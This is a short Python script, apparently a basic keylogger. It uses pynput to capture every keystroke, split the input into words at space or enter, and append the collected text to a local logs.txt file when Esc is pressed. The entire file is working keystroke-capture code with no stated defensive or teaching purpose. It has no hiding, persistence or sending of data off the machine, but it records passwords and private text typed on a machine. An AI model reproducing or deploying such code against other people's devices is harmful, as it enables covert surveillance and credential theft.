from pynput.keyboard import Key, Listener

keysValue = []
tempKeys = ''

def removeQuotesFromString(tempkeys):
    return tempkeys.replace("'", "")

def OnPressEventHandler(key):
    global tempKeys, keysValue
    s = str(key)
    
    if key == Key.space or key == Key.enter: 
        current_keys_Stroke = removeQuotesFromString(tempKeys)
        tempKeys = ''
        keysValue.append(current_keys_Stroke)

    else:
        if key != Key.esc:
            tempKeys += s

        elif key == Key.esc:
            current_keys_Stroke = removeQuotesFromString(tempKeys)
            keysValue.append(current_keys_Stroke)
        else:
            pass
        

def OnReleaseEventHandler(key):
    if key == Key.esc:
        return False
    

if __name__ == '__main__':
    with Listener(
        on_press = OnPressEventHandler,
        on_release = OnReleaseEventHandler) as listen:
        listen.join()
        with open('logs.txt', 'a+') as log:
            log.write(str(keysValue))
            log.write('\n')
    